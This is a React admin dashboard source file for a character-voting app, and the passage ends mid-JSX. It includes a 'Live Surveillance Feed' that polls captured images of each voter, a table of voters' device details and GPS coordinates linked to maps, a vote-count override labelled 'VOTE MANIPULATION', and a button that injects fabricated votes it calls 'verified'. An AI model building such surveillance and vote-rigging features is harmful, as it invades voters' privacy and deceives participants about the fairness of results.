import React, { useState, useEffect } from 'react';
import { Character } from '../types';
import { 
  LayoutDashboard, 
  Users, 
  LogOut, 
  Edit3, 
  Trash2, 
  Save, 
  RefreshCcw, 
  Trophy,
  Activity,
  Search,
  Zap,
  Menu,
  X,
  Image as ImageIcon,
  Upload,
  Link as LinkIcon,
  Monitor,
  Smartphone,
  Globe,
  MapPin,
  Calendar,
  Clock,
  Camera,
  FolderOpen,
  Download,
  FileJson
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { dataService } from '../services/dataService';

interface AdminDashboardProps {
  characters: Character[];
  setCharacters: React.Dispatch<React.SetStateAction<Character[]>>;
  onLogout: () => void;
}

interface VoterLog {
    user: string;
    charId: string;
    timestamp: string;
    deviceInfo?: {
        userAgent: string;
        platform: string;
        screenSize: string;
    },
    location?: {
        lat: number;
        lng: number;
        accuracy: number;
    }
}

const AdminDashboard: React.FC<AdminDashboardProps> = ({ characters, setCharacters, onLogout }) => {
  const [activeTab, setActiveTab] = useState<'overview' | 'characters' | 'voters'>('overview');
  const [editingId, setEditingId] = useState<string | null>(null);
  const [editForm, setEditForm] = useState<Partial<Character>>({});
  const [voterLogs, setVoterLogs] = useState<VoterLog[]>([]);
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  
  // State for Image Upload Toggle
  const [imageUploadType, setImageUploadType] = useState<'url' | 'file'>('url');

  // State for Voting Deadline
  const [deadline, setDeadline] = useState<string>('');
  
  // State for Duration Quick Set
  const [durationDays, setDurationDays] = useState<number>(0);
  const [durationHours, setDurationHours] = useState<number>(0);

  // State for Surveillance Viewer
  const [viewingSurveillance, setViewingSurveillance] = useState<string | null>(null);
  const [surveillanceImages, setSurveillanceImages] = useState<{timestamp: string, url: string}[]>([]);

  // Effect: Periodic Poll for Live Surveillance Feed from Server
  useEffect(() => {
    let interval: any;
    if (viewingSurveillance) {
        // Immediate load via API
        fetchImages(viewingSurveillance);
        
        // Periodic Refresh (every 5 seconds)
        interval = setInterval(() => {
            fetchImages(viewingSurveillance);
        }, 5000);
    }
    return () => clearInterval(interval);
  }, [viewingSurveillance]);

  const fetchImages = async (user: string) => {
      const images = await dataService.getSurveillanceImages(user);
      setSurveillanceImages(images);
  };

  // Effect: Initial Load & Listeners
  useEffect(() => {
    loadLogs();
    // Load deadline
    const savedDeadline = localStorage.getItem('muse_voting_deadline');
    if (savedDeadline) {
        // Convert to local datetime string format for input type="datetime-local" (YYYY-MM-DDThh:mm)
        const date = new Date(savedDeadline);
        const offset = date.getTimezoneOffset() * 60000;
        const localISOTime = (new Date(date.getTime() - offset)).toISOString().slice(0, 16);
        setDeadline(localISOTime);
    }
  }, [characters]);

  const loadLogs = () => {
    const logs: VoterLog[] = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key && key.startsWith('muse_vote_record_')) {
        const user = key.replace('muse_vote_record_', '');
        const value = localStorage.getItem(key) || '';
        
        try {
            // Try parse JSON for new detailed logs
            const parsed = JSON.parse(value);
            if (typeof parsed === 'object') {
                logs.push({
                    user,
                    charId: parsed.charId,
                    timestamp: parsed.timestamp,
                    deviceInfo: parsed.deviceInfo,
                    location: parsed.location
                });
            } else {
                // Legacy support for string format
                logs.push({ user, charId: value, timestamp: new Date().toISOString() });
            }
        } catch (e) {
            // Fallback for plain string
             logs.push({ user, charId: value, timestamp: new Date().toISOString() });
        }
      }
    }
    // Sort by timestamp desc
    logs.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
    setVoterLogs(logs);
  };

  // --- ACTIONS ---

  const handleEditClick = (char: Character) => {
    setEditingId(char.id);
    setEditForm(char);
    setImageUploadType('url'); // Reset default
  };

  const handleSaveEdit = () => {
    if (!editingId) return;
    setCharacters(prev => prev.map(c => c.id === editingId ? { ...c, ...editForm } as Character : c));
    setEditingId(null);
  };

  const handleResetVotes = (id: string) => {
    if (confirm('Are you sure you want to reset votes for this character to 0?')) {
      setCharacters(prev => prev.map(c => c.id === id ? { ...c, votes: 0 } : c));
    }
  };

  const handleSetDuration = () => {
    if (durationDays === 0 && durationHours === 0) {
        alert("Please set a duration greater than 0.");
        return;
    }
    const now = new Date();
    const target = new Date(now.getTime() + (durationDays * 24 * 60 * 60 * 1000) + (durationHours * 60 * 60 * 1000));
    const isoString = target.toISOString();

    // Update the absolute input UI
    const offset = target.getTimezoneOffset() * 60000;
    const localISOTime = (new Date(target.getTime() - offset)).toISOString().slice(0, 16);
    setDeadline(localISOTime);

    localStorage.setItem('muse_voting_deadline', isoString);
    window.dispatchEvent(new StorageEvent('storage', { key: 'muse_voting_deadline', newValue: isoString }));
    alert(`Timer set! Voting ends in ${durationDays} days and ${durationHours} hours.`);
  };

  const handleSaveDeadline = () => {
      if (deadline) {
          const date = new Date(deadline);
          const isoString = date.toISOString();
          localStorage.setItem('muse_voting_deadline', isoString);
          // Dispatch event to update App immediately
          window.dispatchEvent(new StorageEvent('storage', { key: 'muse_voting_deadline', newValue: isoString }));
          alert("Voting deadline updated successfully!");
      } else {
          localStorage.removeItem('muse_voting_deadline');
          window.dispatchEvent(new StorageEvent('storage', { key: 'muse_voting_deadline', newValue: null }));
          alert("Voting deadline removed. Voting is now open indefinitely.");
      }
  };

  // Helper to convert file to base64
  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      if (file.size > 2 * 1024 * 1024) { // 2MB limit
        alert("File too large. Please upload image under 2MB.");
        return;
      }
      const reader = new FileReader();
      reader.onloadend = () => {
        setEditForm({ ...editForm, imageUrl: reader.result as string });
      };
      reader.readAsDataURL(file);
    }
  };

  const handleSimulateTraffic = () => {
    const newChars = [...characters];
    const dummyNames = ["Alex", "Sarah", "Dimas", "Rina", "Joko", "Maya", "Budi", "Citra", "Mega", "Deni"];
    
    // Fake User Agents
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
    ];

    const platforms = ["Win32", "iPhone", "MacIntel", "Linux armv81"];
    
    // Simulate 5 random votes
    for (let i = 0; i < 5; i++) {
        const randomCharIndex = Math.floor(Math.random() * newChars.length);
        const randomUser = `${dummyNames[Math.floor(Math.random() * dummyNames.length)]}_${Math.floor(Math.random() * 9999)}`;
        const randomAgentIdx = Math.floor(Math.random() * userAgents.length);
        
        // Update char votes (in memory)
        newChars[randomCharIndex].votes += 1;
        
        // Create Fake Log Data
        const logData = {
            charId: newChars[randomCharIndex].id,
            timestamp: new Date().toISOString(),
            deviceInfo: {
                userAgent: userAgents[randomAgentIdx],
                platform: platforms[randomAgentIdx],
                screenSize: `${1000 + Math.floor(Math.random()*900)}x${600 + Math.floor(Math.random()*400)}`,
                language: 'en-US'
            },
            // Add Fake Location for simulation
            location: {
                lat: -6.2088 + (Math.random() * 0.1),
                lng: 106.8456 + (Math.random() * 0.1),
                accuracy: Math.floor(Math.random() * 50) + 10
            }
        };
        
        // Persist to local storage
        localStorage.setItem(`muse_vote_record_${randomUser}`, JSON.stringify(logData));
    }

    setCharacters(newChars);
    alert("Simulation complete: 5 new verified votes added with device & location telemetry.");
  };

  // --- JSON DATABASE EXPORT/IMPORT ---
  const handleExportDatabase = () => {
    const backupData: Record<string, any> = {
        meta: {
            exportDate: new Date().toISOString(),
            version: '1.0'
        },
        data: {}
    };

    // Collect all data starting with 'muse_'
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key && key.startsWith('muse_')) {
            backupData.data[key] = localStorage.getItem(key);
        }
    }

    // Create Blob and Link
    const blob = new Blob([JSON.stringify(backupData, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `muse_database_backup_${new Date().toISOString().slice(0,10)}.json`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const handleImportDatabase = (e: React.ChangeEvent<HTMLInputElement>) => {
      const file = e.target.files?.[0];
      if (!file) return;

      if (!confirm("WARNING: Importing a database will OVERWRITE all current data. This cannot be undone. Are you sure?")) {
          return;
      }

      const reader = new FileReader();
      reader.onload = (ev) => {
          try {
              const json = JSON.parse(ev.target?.result as string);
              if (json.meta && json.data) {
                  // Valid format
                  // 1. Clear current MUSE data
                  const keysToRemove = [];
                  for(let i=0; i<localStorage.length; i++) {
                      const key = localStorage.key(i);
                      if(key && key.startsWith('muse_')) keysToRemove.push(key);
                  }
                  keysToRemove.forEach(k => localStorage.removeItem(k));

                  // 2. Restore data
                  Object.keys(json.data).forEach(key => {
                      localStorage.setItem(key, json.data[key]);
                  });

                  // 3. Update State
                  if (json.data['muse_characters']) {
                      setCharacters(JSON.parse(json.data['muse_characters']));
                  }
                  
                  // Trigger reload or refresh
                  loadLogs();
                  alert("Database restored successfully!");
              } else {
                  alert("Invalid JSON structure. Please use a file exported from this system.");
              }
          } catch (err) {
              console.error(err);
              alert("Failed to parse JSON file.");
          }
      };
      reader.readAsText(file);
  };

  const handleGlobalReset = () => {
    const confirmText = prompt("Type 'RESET' to delete ALL votes and voter records.");
    if (confirmText === 'RESET') {
        setCharacters(prev => prev.map(c => ({ ...c, votes: 0 })));
        const keysToRemove = [];
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key && key.startsWith('muse_vote_record_') || key.startsWith('muse_img_')) {
                keysToRemove.push(key);
            }
        }
        keysToRemove.forEach(k => localStorage.removeItem(k));
        setVoterLogs([]);
        setSurveillanceImages([]);
        setViewingSurveillance(null);
        alert("System reset complete.");
    }
  };

  const totalVotes = characters.reduce((sum, c) => sum + c.votes, 0);
  const topCharacter = [...characters].sort((a, b) => b.votes - a.votes)[0];

  return (
    <div className="flex h-screen bg-slate-950 text-slate-200 font-sans overflow-hidden">
      
      {/* MOBILE HEADER */}
      <div className="md:hidden fixed top-0 left-0 right-0 h-16 bg-slate-900 border-b border-slate-800 flex items-center justify-between px-4 z-50">
          <div className="flex items-center gap-3">
             <div className="w-8 h-8 rounded bg-indigo-600 flex items-center justify-center font-bold text-white">M</div>
             <span className="font-display font-bold text-lg">MUSE ADMIN</span>
          </div>
          <button onClick={() => setIsSidebarOpen(true)} className="text-slate-300">
             <Menu size={24} />
          </button>
      </div>

      {/* MOBILE SIDEBAR BACKDROP */}
      {isSidebarOpen && (
          <div 
            className="fixed inset-0 bg-black/50 z-50 md:hidden backdrop-blur-sm"
            onClick={() => setIsSidebarOpen(false)}
          />
      )}

      {/* SIDEBAR (Responsive) */}
      <aside className={`
          fixed md:relative top-0 left-0 h-full w-64 bg-slate-900 border-r border-slate-800 flex flex-col z-50 transition-transform duration-300
          ${isSidebarOpen ? 'translate-x-0' : '-translate-x-full md:translate-x-0'}
      `}>
        <div className="p-6 border-b border-slate-800 flex items-center justify-between">
          <div className="flex items-center gap-3">
             <div className="w-8 h-8 rounded bg-indigo-600 flex items-center justify-center font-bold text-white">M</div>
             <span className="font-display font-bold text-xl tracking-wide hidden md:block">ADMIN</span>
          </div>
          <button onClick={() => setIsSidebarOpen(false)} className="md:hidden text-slate-400">
             <X size={20} />
          </button>
        </div>
        
        <nav className="flex-1 p-4 space-y-2">
          <button 
            onClick={() => { setActiveTab('overview'); setIsSidebarOpen(false); }}
            className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'overview' ? 'bg-indigo-600/20 text-indigo-300 border border-indigo-500/30' : 'text-slate-400 hover:bg-slate-800'}`}
          >
            <LayoutDashboard size={18} />
            <span className="font-medium">Overview</span>
          </button>
          
          <button 
            onClick={() => { setActiveTab('characters'); setIsSidebarOpen(false); }}
            className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'characters' ? 'bg-indigo-600/20 text-indigo-300 border border-indigo-500/30' : 'text-slate-400 hover:bg-slate-800'}`}
          >
            <Users size={18} />
            <span className="font-medium">Characters</span>
          </button>

          <button 
            onClick={() => { setActiveTab('voters'); setIsSidebarOpen(false); }}
            className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'voters' ? 'bg-indigo-600/20 text-indigo-300 border border-indigo-500/30' : 'text-slate-400 hover:bg-slate-800'}`}
          >
            <Activity size={18} />
            <span className="font-medium">Voter Logs</span>
          </button>
        </nav>

        <div className="p-4 border-t border-slate-800">
           <button 
             onClick={onLogout}
             className="w-full flex items-center gap-2 px-4 py-2 text-slate-400 hover:text-red-400 transition-colors"
           >
             <LogOut size={16} />
             <span>Logout</span>
           </button>
        </div>
      </aside>

      {/* MAIN CONTENT */}
      <main className="flex-1 overflow-y-auto bg-slate-950 p-4 md:p-8 relative pt-20 md:pt-8 no-scrollbar">
         <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-5 pointer-events-none"></div>

         <div className="max-w-5xl mx-auto relative z-10 pb-10">
            
            {/* --- OVERVIEW TAB --- */}
            {activeTab === 'overview' && (
              <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
                 <div className="flex flex-col md:flex-row justify-between items-start md:items-end gap-4 mb-6">
                     <h1 className="text-2xl md:text-3xl font-display font-bold text-white">Dashboard Overview</h1>
                     <button 
                        onClick={handleSimulateTraffic}
                        className="w-full md:w-auto bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 px-4 py-2 rounded-lg text-sm font-bold flex items-center justify-center gap-2 transition-colors"
                     >
                        <Zap size={16} />
                        Simulate Traffic (+5 Votes)
                     </button>
                 </div>

                 {/* --- VOTING DEADLINE SETTINGS --- */}
                 <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 relative overflow-hidden">
                    <div className="absolute top-0 right-0 p-3 opacity-10">
                        <Clock size={100} />
                    </div>
                    <h3 className="text-lg font-bold text-white mb-4 flex items-center gap-2">
                        <Calendar size={18} className="text-indigo-400"/>
                        Voting Duration & Deadline
                    </h3>
                    
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6 relative z-10">
                        
                        {/* Option 1: Set by Duration */}
                        <div className="bg-slate-950/50 p-4 rounded-xl border border-slate-800">
                             <h4 className="text-xs font-bold text-slate-400 uppercase mb-3">Option A: Set Duration</h4>
                             <div className="flex items-end gap-2">
                                <div className="flex-1">
                                    <label className="text-[10px] text-slate-500 mb-1 block">Days</label>
                                    <input 
                                        type="number" 
                                        min="0"
                                        className="w-full bg-slate-900 border border-slate-700 text-white rounded-lg px-3 py-2 outline-none text-sm focus:border-indigo-500 font-mono"
                                        value={durationDays}
                                        onChange={(e) => setDurationDays(parseInt(e.target.value) || 0)}
                                    />
                                </div>
                                <div className="flex-1">
                                    <label className="text-[10px] text-slate-500 mb-1 block">Hours</label>
                                    <input 
                                        type="number" 
                                        min="0"
                                        className="w-full bg-slate-900 border border-slate-700 text-white rounded-lg px-3 py-2 outline-none text-sm focus:border-indigo-500 font-mono"
                                        value={durationHours}
                                        onChange={(e) => setDurationHours(parseInt(e.target.value) || 0)}
                                    />
                                </div>
                                <button 
                                    onClick={handleSetDuration}
                                    className="bg-indigo-600 hover:bg-indigo-500 text-white font-bold p-2.5 rounded-lg transition-colors flex items-center justify-center shadow-lg shadow-indigo-900/20"
                                    title="Start Timer"
                                >
                                    <Zap size={18} />
                                </button>
                             </div>
                        </div>

                        {/* Option 2: Set by Date */}
                        <div className="bg-slate-950/50 p-4 rounded-xl border border-slate-800">
                             <h4 className="text-xs font-bold text-slate-400 uppercase mb-3">Option B: End Date</h4>
                             <div className="flex flex-col gap-2">
                                <input 
                                    type="datetime-local" 
                                    className="w-full bg-slate-900 border border-slate-700 text-white rounded-lg px-3 py-2 focus:border-indigo-500 outline-none text-xs md:text-sm font-mono"
                                    value={deadline}
                                    onChange={(e) => setDeadline(e.target.value)}
                                />
                                <div className="flex gap-2">
                                    <button 
                                    onClick={handleSaveDeadline}
                                    className="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-2 rounded-lg text-xs transition-colors"
                                    >
                                    Update Date
                                    </button>
                                    <button 
                                    onClick={() => {
                                        setDeadline('');
                                        setTimeout(handleSaveDeadline, 100);
                                    }}
                                    className="bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/20 px-3 rounded-lg flex items-center justify-center"
                                    title="Stop/Clear Timer"
                                    >
                                    <X size={14} />
                                    </button>
                                </div>
                             </div>
                        </div>
                    </div>

                    <p className="text-xs text-slate-500 mt-4 text-center md:text-left">
                        Setting a deadline creates a global countdown. Voting automatically closes when the time expires.
                    </p>
                 </div>
                 
                 {/* Stats Cards */}
                 <div className="grid grid-cols-1 md:grid-cols-3 gap-4 md:gap-6">
                    <div className="bg-slate-900 border border-slate-800 p-6 rounded-2xl">
                       <div className="flex items-center justify-between mb-4">
                          <h3 className="text-slate-400 text-sm font-medium">Total Votes</h3>
                          <Activity className="text-indigo-500" size={20} />
                       </div>
                       <p className="text-4xl font-bold text-white">{totalVotes}</p>
                       <p className="text-xs text-green-400 mt-2 flex items-center gap-1">
                          Live Data
                       </p>
                    </div>

                    <div className="bg-slate-900 border border-slate-800 p-6 rounded-2xl relative overflow-hidden">
                       <div className="absolute -right-4 -top-4 w-24 h-24 bg-amber-500/10 rounded-full blur-2xl"></div>
                       <div className="flex items-center justify-between mb-4 relative z-10">
                          <h3 className="text-slate-400 text-sm font-medium">Leading Character</h3>
                          <Trophy className="text-amber-500" size={20} />
                       </div>
                       <p className="text-xl font-bold text-white truncate">{topCharacter?.name || 'No Data'}</p>
                       <p className="text-sm text-slate-500 mt-1">{topCharacter?.role}</p>
                    </div>

                    <div className="bg-slate-900 border border-slate-800 p-6 rounded-2xl">
                       <div className="flex items-center justify-between mb-4">
                          <h3 className="text-slate-400 text-sm font-medium">Unique Voters</h3>
                          <Users className="text-blue-500" size={20} />
                       </div>
                       <p className="text-4xl font-bold text-white">{voterLogs.length}</p>
                    </div>
                 </div>

                 {/* Distribution Chart */}
                 <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 mt-6">
                    <h3 className="text-lg font-bold text-white mb-6">Vote Distribution</h3>
                    <div className="space-y-4">
                       {characters.map(char => (
                         <div key={char.id}>
                            <div className="flex justify-between text-sm mb-1">
                               <span className="text-slate-300">{char.name}</span>
                               <span className="text-slate-400">{char.votes} votes</span>
                            </div>
                            <div className="w-full bg-slate-800 h-2.5 rounded-full overflow-hidden">
                               <motion.div 
                                 initial={{ width: 0 }}
                                 animate={{ width: `${totalVotes > 0 ? (char.votes / totalVotes) * 100 : 0}%` }}
                                 transition={{ type: "spring", stiffness: 50 }}
                                 className={`h-full bg-gradient-to-r ${char.themeColor}`} 
                               />
                            </div>
                         </div>
                       ))}
                    </div>
                 </div>
                 
                 {/* DATABASE EXPORT / IMPORT SECTION */}
                 <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 mt-6">
                    <h3 className="text-lg font-bold text-white mb-4 flex items-center gap-2">
                        <FileJson size={18} className="text-blue-400"/>
                        Database Management (JSON)
                    </h3>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <button 
                            onClick={handleExportDatabase}
                            className="bg-blue-600/20 hover:bg-blue-600/30 text-blue-400 border border-blue-500/30 px-4 py-3 rounded-lg text-sm font-bold flex items-center justify-center gap-2 transition-colors"
                        >
                            <Download size={16} />
                            Backup Database to JSON
                        </button>
                        
                        <div className="relative">
                            <input 
                                type="file" 
                                accept=".json"
                                onChange={handleImportDatabase}
                                className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                            />
                            <button className="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 px-4 py-3 rounded-lg text-sm font-bold flex items-center justify-center gap-2 transition-colors">
                                <Upload size={16} />
                                Restore from JSON
                            </button>
                        </div>
                    </div>
                    <p className="text-xs text-slate-500 mt-2">
                        Note: Restoring a JSON file will overwrite all current character votes, logs, and surveillance images.
                    </p>
                 </div>

                 <div className="mt-8 pt-8 border-t border-slate-800">
                    <button 
                      onClick={handleGlobalReset}
                      className="w-full md:w-auto bg-red-500/10 hover:bg-red-500/20 text-red-500 border border-red-500/30 px-4 py-2 rounded-lg text-sm font-bold flex items-center justify-center gap-2 transition-colors"
                    >
                      <Trash2 size={16} />
                      Factory Reset System
                    </button>
                    <p className="text-xs text-slate-500 mt-2 text-center md:text-left">Warning: This will delete all votes and user records permanently.</p>
                 </div>

              </motion.div>
            )}

            {/* --- CHARACTERS TAB --- */}
            {activeTab === 'characters' && (
              <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}>
                 <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 mb-6">
                    <h1 className="text-2xl md:text-3xl font-display font-bold text-white">Character Management</h1>
                    <button className="w-full md:w-auto bg-indigo-600 hover:bg-indigo-500 text-white px-4 py-2 rounded-lg text-sm font-bold flex items-center justify-center gap-2">
                       + Add New (Mock)
                    </button>
                 </div>

                 <div className="grid gap-4">
                    {characters.map(char => (
                       <div key={char.id} className="bg-slate-900 border border-slate-800 rounded-xl p-4 flex flex-col md:flex-row gap-4 items-start">
                          <img src={char.imageUrl} alt={char.name} className="w-full md:w-20 h-40 md:h-28 object-cover rounded-lg bg-slate-800" />
                          
                          <div className="flex-1 w-full space-y-3">
                             {editingId === char.id ? (
                               // EDIT MODE
                               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                  <div>
                                    <label className="text-xs text-slate-500">Name</label>
                                    <input 
                                      type="text" 
                                      className="w-full bg-slate-950 border border-slate-700 rounded p-2 text-sm text-white focus:border-indigo-500 outline-none"
                                      value={editForm.name}
                                      onChange={e => setEditForm({...editForm, name: e.target.value})}
                                    />
                                  </div>
                                  <div>
                                    <label className="text-xs text-slate-500">Role</label>
                                    <input 
                                      type="text" 
                                      className="w-full bg-slate-950 border border-slate-700 rounded p-2 text-sm text-white focus:border-indigo-500 outline-none"
                                      value={editForm.role}
                                      onChange={e => setEditForm({...editForm, role: e.target.value})}
                                    />
                                  </div>
                                  
                                  {/* NEW: VOTE MANIPULATION */}
                                  <div>
                                    <label className="text-xs text-slate-500 flex items-center gap-1">
                                        <Trophy size={12} className="text-amber-500" /> Vote Count (Override)
                                    </label>
                                    <input 
                                      type="number" 
                                      min="0"
                                      className="w-full bg-slate-950 border border-slate-700 rounded p-2 text-sm text-white focus:border-indigo-500 outline-none font-mono"
                                      value={editForm.votes}
                                      onChange={e => setEditForm({...editForm, votes: parseInt(e.target.value) || 0})}
                                    />
                                  </div>

                                  <div className="md:col-span-2">
                                     <div className="flex gap-4 mb-2 border-b border-slate-700 pb-1">
                                        <button 
                                            onClick={() => setImageUploadType('url')}
                                            className={`text-xs flex items-center gap-1 pb-1 ${imageUploadType === 'url' ? 'text-indigo-400 border-b border-indigo-400' : 'text-slate-500'}`}
                                        >
                                            <LinkIcon size={12} /> Image URL
                                        </button>
                                        <button 
                                            onClick={() => setImageUploadType('file')}
                                            className={`text-xs flex items-center gap-1 pb-1 ${imageUploadType === 'file' ? 'text-indigo-400 border-b border-indigo-400' : 'text-slate-500'}`}
                                        >
                                            <Upload size={12} /> Upload File
                                        </button>
                                     </div>
                                     
                                     {imageUploadType === 'url' ? (
                                         <input 
                                            type="text" 
                                            className="w-full bg-slate-950 border border-slate-700 rounded p-2 text-sm text-white focus:border-indigo-500 outline-none font-mono text-xs text-slate-400"
                                            value={editForm.imageUrl || ''}
                                            placeholder="https://example.com/image.jpg"
                                            onChange={e => setEditForm({...editForm, imageUrl: e.target.value})}
                                         />
                                     ) : (
                                         <input 
                                            type="file"
                                            accept="image/*"
                                            className="w-full bg-slate-950 border border-slate-700 rounded p-2 text-sm text-slate-400 file:mr-4 file:py-1 file:px-2 file:rounded-full file:border-0 file:text-xs file:font-semibold file:bg-indigo-600 file:text-white hover:file:bg-indigo-700"
                                            onChange={handleFileUpload}
                                         />
                                     )}
                                     {editForm.imageUrl && (
                                         <div className="mt-2 text-[10px] text-slate-500 truncate max-w-[200px]">
                                             Current: {editForm.imageUrl.substring(0, 30)}...
                                         </div>
                                     )}
                                  </div>

                                  <div className="md:col-span-2">
                                    <label className="text-xs text-slate-500">Description</label>
                                    <textarea 
                                      className="w-full bg-slate-950 border border-slate-700 rounded p-2 text-sm text-white focus:border-indigo-500 outline-none"
                                      rows={2}
                                      value={editForm.description}
                                      onChange={e => setEditForm({...editForm, description: e.target.value})}
                                    />
                                  </div>
                                  <div className="md:col-span-2 flex gap-2">
                                     <button 
                                       onClick={handleSaveEdit}
                                       className="bg-green-600/20 text-green-400 border border-green-600/30 px-3 py-1.5 rounded text-xs font-bold flex items-center gap-1 hover:bg-green-600/30"
                                     >
                                        <Save size={14} /> Save
                                     </button>
                                     <button 
                                       onClick={() => setEditingId(null)}
                                       className="bg-slate-800 text-slate-400 px-3 py-1.5 rounded text-xs font-bold hover:bg-slate-700"
                                     >
                                        Cancel
                                     </button>
                                  </div>
                               </div>
                             ) : (
                               // VIEW MODE
                               <>
                                 <div className="flex justify-between items-start w-full">
                                    <div>
                                      <h3 className="font-bold text-lg text-white">{char.name}</h3>
                                      <p className="text-indigo-400 text-xs font-medium uppercase tracking-wider">{char.role}</p>
                                    </div>
                                    <div className="flex gap-2">
                                       <button 
                                         onClick={() => handleEditClick(char)}
                                         className="p-2 bg-slate-800 hover:bg-slate-700 rounded-lg text-slate-300 transition-colors" title="Edit"
                                       >
                                         <Edit3 size={16} />
                                       </button>
                                    </div>
                                 </div>
                                 <p className="text-slate-400 text-sm line-clamp-2">{char.description}</p>
                                 <div className="pt-2 flex flex-wrap items-center gap-4 border-t border-slate-800/50 mt-2">
                                    <div className="text-sm font-bold text-white">
                                       Votes: <span className="text-indigo-400">{char.votes}</span>
                                    </div>
                                    <button 
                                      onClick={() => handleResetVotes(char.id)}
                                      className="text-xs text-red-400 hover:text-red-300 flex items-center gap-1"
                                    >
                                       <RefreshCcw size={12} /> Reset Votes
                                    </button>
                                 </div>
                               </>
                             )}
                          </div>
                       </div>
                    ))}
                 </div>
              </motion.div>
            )}

            {/* --- VOTERS LOG TAB --- */}
            {activeTab === 'voters' && (
              <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}>
                 <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 mb-6">
                    <h1 className="text-2xl md:text-3xl font-display font-bold text-white">Voter Logs</h1>
                    <div className="relative w-full md:w-auto">
                       <Search className="absolute left-3 top-2.5 text-slate-500" size={16} />
                       <input 
                         type="text" 
                         placeholder="Search user..." 
                         className="w-full md:w-64 bg-slate-900 border border-slate-800 rounded-full pl-10 pr-4 py-2 text-sm text-white focus:border-indigo-500 outline-none"
                       />
                    </div>
                 </div>

                 <div className="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden overflow-x-auto">
                    <table className="w-full text-left text-sm min-w-[800px]">
                       <thead className="bg-slate-800/50 text-slate-400 font-medium">
                          <tr>
                             <th className="p-4">User</th>
                             <th className="p-4">Surveillance</th>
                             <th className="p-4">Vote Target</th>
                             <th className="p-4">Device & Location</th>
                             <th className="p-4">Timestamp</th>
                             <th className="p-4 text-right">Status</th>
                          </tr>
                       </thead>
                       <tbody className="divide-y divide-slate-800">
                          {voterLogs.length === 0 ? (
                            <tr>
                               <td colSpan={6} className="p-8 text-center text-slate-500 italic">No votes recorded yet.</td>
                            </tr>
                          ) : (
                            voterLogs.map((log, idx) => (
                              <tr key={idx} className="hover:bg-slate-800/30 transition-colors group">
                                 <td className="p-4 font-mono text-indigo-300 font-bold">{log.user}</td>
                                 <td className="p-4">
                                     <button 
                                        onClick={() => { setViewingSurveillance(log.user); }}
                                        className="flex items-center gap-2 px-3 py-1.5 bg-slate-800 hover:bg-indigo-600/20 text-slate-300 hover:text-indigo-400 rounded-lg border border-slate-700 transition-colors"
                                     >
                                         <FolderOpen size={14} />
                                         <span className="text-xs font-bold">View Folder</span>
                                     </button>
                                 </td>
                                 <td className="p-4">
                                   <span className="bg-slate-800 border border-slate-700 px-2 py-1 rounded text-xs text-slate-300 whitespace-nowrap">
                                     {characters.find(c => c.id === log.charId)?.name || log.charId}
                                   </span>
                                 </td>
                                 <td className="p-4">
                                     <div className="space-y-2">
                                        {/* Device Info */}
                                        {log.deviceInfo ? (
                                            <div className="flex flex-col text-xs text-slate-400 gap-1">
                                                <div className="flex items-center gap-1.5" title={log.deviceInfo.userAgent}>
                                                    {log.deviceInfo.userAgent.toLowerCase().includes('mobile') || log.deviceInfo.userAgent.toLowerCase().includes('iphone') 
                                                        ? <Smartphone size={12} className="text-slate-500"/> 
                                                        : <Monitor size={12} className="text-slate-500"/>
                                                    }
                                                    <span className="truncate max-w-[150px]">{log.deviceInfo.platform}</span>
                                                </div>
                                            </div>
                                        ) : <span className="text-xs text-slate-600 italic">No Device Data</span>}

                                        {/* Location Info */}
                                        {log.location ? (
                                            <div className="flex items-center gap-2 text-xs">
                                                <a 
                                                    href={`https://www.google.com/maps?q=${log.location.lat},${log.location.lng}`} 
                                                    target="_blank" 
                                                    rel="noopener noreferrer"
